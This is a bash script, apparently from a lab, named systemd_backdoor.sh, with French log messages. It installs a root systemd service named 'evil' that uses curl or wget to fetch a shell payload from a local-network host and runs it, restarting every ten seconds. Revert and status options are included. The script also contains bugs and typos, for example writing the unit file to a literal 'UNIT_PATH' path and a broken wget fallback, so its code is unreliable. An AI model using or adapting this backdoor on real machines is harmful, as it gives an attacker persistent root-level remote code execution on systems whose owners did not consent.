#!/usr/bin/env bash 

set -euo pipefail

SERVICE_NAME="evil"
UNIT_PATH="/etc/systemd/system/${SERVICE_NAME}.service"

SHELL_BIN="/bin/sh"
RESTART_POLICY="always"
RESTART_SEC="10"
DEFAULT_URL="http://192.168.56.2:8000/payloads/payload_systemd.sh"

log(){
  echo "[$(date +'%F %T')] $*";
}

usage(){
  cat <<'USAGE'
Usage:
  sudo ./systemd_backdoor.sh --apply 
  sudo ./systemd_backdoor.sh --revert 
  suod ./systemd_backdoor.sh --status 
USAGE
}

ensure_root(){
  local option="$1"; shift
  if [[${EUID:-$(id -u)} -ne 0]]; then 
    log "sudo requis : relance avec sudo.."
    exec sudo -E "$0" "$option" 
  fi
}

have(){
  command -v "$1" >/dev/null 2>&1;
}

apply_changes(){
  ensure_root --apply 
  local  url="$DEFAULT_URL"
  log "Ecriture de ${UNIT_PATH}"
  cat > "UNIT_PATH" <<EOF 
[Unit]
Description=Lab backdoor which downloads and runs $url 
After=network-online.target
Wants=network-online.target 

[Service]
Type=simple 
User=root
Environement=PATH=/usr/sbin:/usr/bin:/sbin:/bin
ExecStart=$SHELL_BIN -c "curl -fsSL ${url} | $SHELL_BIN  || wget -qO- ${url} $SHELL_BIN"
Restart=${RESTART_POLICY}
RestartSec=${RESTART_SEC}

[Install]
WantedBy=multi-user.target
EOF

  chmod 0644 "$UNIT_PATH"
  systemctl daemon-reload 
  systemctl enable --now "${SERVICE_NAME}.service"
  log "Service ${SERVICE_NAME}.service installé et démarré."
  systemctl status "${SERVICE_NAME}.service" --no-pager -l || true
}

revert_changes(){
  ensure_root --revert 
  log "Stop + disable ${SERVICE_NAME}.service"
  systemctl disable --now "{SERVICE_NAME}.service" || true 
  if [[ -f "$UNIT_PATH" ]]; then 
    log "Suppression ${UNIT_PATH}"
    rm -f "${UNIT_PATH}"
  fi
  systemctl daemon-reload 
  log "OK." 
}

status_service(){
  systemctl status "${SERVICE_NAME}.service" --no-pager -l || true 
  echo "------- systemd unit ----------"
  systemctl cat "${SERVICE_NAME}.service" || true 
}

main(){
  case "${1}" in
    --apply) apply_changes;;
    --revert) revert_changes;;
    --status) status_service;;
    *) usage; exit 1;;
  esac
}

main "$@"
